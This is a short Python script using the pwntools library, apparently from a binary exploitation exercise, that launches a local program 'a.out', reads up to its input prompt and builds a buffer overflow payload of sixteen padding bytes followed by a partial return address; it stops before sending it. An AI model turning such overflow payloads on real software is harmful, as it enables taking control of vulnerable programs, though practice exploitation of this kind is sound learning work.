from pwn import *

x = process("a.out")

x.readuntil("Input:");

payload = b"A"*16 + b"\x76\x11\40"